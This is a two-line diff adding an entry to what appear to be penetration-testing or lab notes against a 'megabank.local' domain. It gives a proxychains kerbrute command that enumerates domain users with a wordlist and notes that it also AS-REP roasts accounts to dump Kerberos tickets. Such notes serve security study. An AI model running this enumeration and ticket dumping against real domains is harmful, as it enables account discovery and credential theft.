@@ -1,0 +1,2 @@
+- Enumerate domain users( this also performs ASRep Roasting to dump tickets for accounts with pre auth disabled)
+`proxychains kerbrute userenum --dc $IP -d megabank.local /usr/share/seclists/Usernames/Names/names.txt`
